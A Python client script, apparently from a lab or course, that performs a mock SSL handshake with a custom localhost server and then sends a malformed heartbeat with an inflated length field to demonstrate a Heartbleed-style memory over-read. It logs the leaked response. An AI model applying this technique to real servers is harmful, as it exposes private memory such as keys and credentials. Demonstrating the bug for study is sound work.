import socket
from SSLPacket import SSLPacket, H_BEAT, H_SHAKE, C_HELLO, S_HELLO, CERT, S_KEY_EX, CERT_REQ, S_HELLO_FIN, CERT_VERIFY, C_KEY_EX, FIN, END
import time
import random
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

HOST='127.0.0.1'  #the server's hostname oR IP address
PORT=65432        #the port used by the server
BUFSIZE= 1024      #Buffer size

ClientCertificate = ["90379354261689780614203361405066170842644723517796574222141854180560344772929272012047686310740292793858442680786609301853884797311016993037398154923585814309315960075335524608558911708042439955987587920532929476982763655302759320622825896839586342939599330666828311177100229979175366428849697156471500053891",
    "134826985114428444222462262938720519942370306697674624544196516605831833735004883494376346424588162261458949450778671388432645230306358735895459878500095280375007785405742699239392672308148029141138996288755657310543102011633317786177948435028192747032104760717067043386242538499142434213337297046792902557149"]

def hexToString(h):
    return "".join([chr(int(el, 16)) for el in h])

def sendHelloPacket(conn):
    hello_packet = SSLPacket(type=H_SHAKE, payload_type=C_HELLO)
    logging.info("Sending Hello Packet to Server...")
    conn.send(hello_packet.encode())
    logging.info("Hello Packet Sent")

def receiveHelloPacket(conn):
    try:
        s = conn.recv(BUFSIZE)
        packet = SSLPacket().decode(s)
        if packet.payload_type == S_HELLO:
            logging.info("Received Hello Packet from Server")
    except Exception as e:
        logging.error(f"Error receiving Hello Packet: {e}")

def receiveCertificate(conn):
    try:
        s = conn.recv(BUFSIZE)
        packet = SSLPacket().decode(s)
        if packet.payload_type == S_KEY_EX:
            logging.info("Server certificate received")
    except Exception as e:
        logging.error(f"Error receiving Certificate: {e}")

def receiveServerHelloDone(conn):
    try:
        s = conn.recv(BUFSIZE)
        packet = SSLPacket().decode(s)
        if packet.payload_type == S_HELLO_FIN:
            logging.info("Received Server Hello Done")
    except Exception as e:
        logging.error(f"Error receiving Server Hello Done: {e}")
def sendCertificate(conn):
    packet = SSLPacket(type=H_SHAKE, payload_type=C_KEY_EX, payload=ClientCertificate)
    logging.info("Sending Client Certificate...")
    conn.send(packet.encode())
    logging.info("Client Certificate Sent")
def sendFin(conn):
    packet = SSLPacket(type=H_SHAKE, payload_type=FIN)
    logging.info("Sending FIN Packet to Server...")
    conn.send(packet.encode())
    logging.info("FIN Packet Sent")

def receiveFin(conn):
    try:
        s = conn.recv(BUFSIZE)
        packet = SSLPacket().decode(s)
        if packet.payload_type == FIN:
            logging.info("Received Server FIN Packet")
    except Exception as e:
        logging.error(f"Error receiving FIN Packet: {e}")

def handshake(conn):
    logging.info("----- Handshake Initiated -----")
    time.sleep(1)
    sendHelloPacket(conn)
    receiveHelloPacket(conn)
    receiveCertificate(conn)
    receiveServerHelloDone(conn)
    time.sleep(1)
    sendCertificate(conn)
    sendFin(conn)
    receiveFin(conn)
    logging.info("----- Handshake Completed -----")
    time.sleep(1)

def sendHeartBeat(conn, data, length):
    packet = SSLPacket(type=H_BEAT, length=length, payload_type=H_BEAT, payload=data)
    logging.info(f"Sending HeartBeat: data={data}, length={length}")
    conn.send(packet.encode())

def receiveHeartBeatResponse(conn):
    try:
        s = conn.recv(BUFSIZE)
        packet = SSLPacket().decode(s)
        if packet.type == H_BEAT:
            data = packet.payload
            logging.info("Received HeartBeat Response from Server")
            with open('client_log.txt', 'a') as f:
                f.write(f"\nServer Response to HeartBeat:\n{repr(data)}\n")
            return data
    except Exception as e:
        logging.error(f"Error receiving HeartBeat Response: {e}")
    return None

def endConnection(conn):
    packet = SSLPacket(type=END)
    logging.info("Sending END Packet to Server...")
    conn.send(packet.encode())
    logging.info("END Packet Sent")

def attack(conn):
    logging.info("----- Testing Normal HeartBeat -----")
    hb_data = "HelloHello"
    length = 8
    time.sleep(1)
    logging.info(f"HeartBeat: data={hb_data}, length={length}")
    logging.info("Sending Normal HeartBeat...")
    sendHeartBeat(conn, hb_data, length)
    response = receiveHeartBeatResponse(conn)
    logging.info("\nServer Response to Normal HeartBeat:")
    logging.info("."*40)
    logging.info(response)
    logging.info("."*40)
    time.sleep(1)
    logging.info("----- Exploiting HeartBleed Vulnerability -----")
    hb_data = "HelloHello"
    length = random.randint(100, 200)
    logging.info(f"HeartBeat: data={hb_data}, length={length}")
    logging.info("Sending Malformed HeartBeat to Exploit Vulnerability...")
    sendHeartBeat(conn, hb_data, length)
    response = receiveHeartBeatResponse(conn)
    logging.info("\nServer Response to Malformed HeartBeat:")
    logging.info("."*40)
    logging.info(response)
    logging.info("."*40)
    logging.info("----- HeartBleed Exploit Completed -----")
    time.sleep(1)

def startClient():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            logging.info('Connecting to server...')
            s.connect((HOST, PORT))
            logging.info("Connected to server")
            handshake(s)
            attack(s)
            endConnection(s)
            logging.info("Connection closed gracefully")
        except Exception as e:
            logging.error(f"An error occurred: {e}")
            endConnection(s)

if __name__ == "__main__":
    startClient()